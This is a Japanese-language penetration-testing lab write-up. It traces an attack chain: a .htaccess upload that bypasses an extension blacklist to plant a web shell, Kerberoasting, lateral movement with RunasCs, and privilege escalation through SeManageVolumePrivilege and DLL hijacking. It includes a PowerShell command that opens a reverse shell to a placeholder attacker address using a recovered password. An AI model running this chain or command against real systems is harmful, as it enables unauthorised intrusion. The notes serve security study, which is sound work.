`.htaccess`の上書きによって拡張子のブラックリストをバイパスし、内部に侵入。Kerberoastingで入手した認証情報を用いて[RunasCs](https://github.com/antonioCoco/RunasCs)で横移動。`SeManageVolumePrivilege`を利用して権限昇格した。

1. Port ScanでHTTPサービスがopenであることを確認

2. HTTPサービスにファイルアップロード機能があり、phpファイルをアップロードすると、"The file extension is not allowed !!"という、拡張子ブラックリストを示唆するレスポンスが返った（file.hogehogeはアップロードできたので、ホワイトリストではない）

3. [[⚡️File upload vuln#ブラックリスト回避テクニック]]を試すも失敗したので、[[⚡️File upload vuln#サーバ設定の上書きによるバイパス]]を参考に、`.htaccess`をアップロードしたところ、設定を上書きでき、Web shellを獲得できた
	- **反省**：ファイルアップロードが可能、かつ、ブラックリストで妨害される場合は、サーバ設定の上書きを検討すること

4. Active Directory環境であるため、SharpHoundを内部で実行し、BloodHoundにインポートして列挙したところ、Kerberoastingが可能なユーザーを発見したので、認証情報を入手

5. ユーザー名が`svc_mssql`であったこと、xampp配下にmysqlがあったため、MySQLやMSSQLでログインできないかどうかを試すも失敗し、ADMIN$への書き込み権限もないため横展開に詰まった

6. [RunasCs](https://github.com/antonioCoco/RunasCs)を使ってリバースシェルを獲得して横移動成功（[[💥Lateral Movement & Persistance in AD#RunasCs]]）
```powershell
Import-Module .\Invoke-RunasCs.ps1

Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command powershell.exe -Remote <AttackerIP>:<Port>
```

7. 横移動したユーザーの権限に`SeManageVolumePrivilege`があったため、[SeManageVolumePrivilege Escalation- Hackfast](https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/)を参照し、DLL Hijackingの手法で権限昇格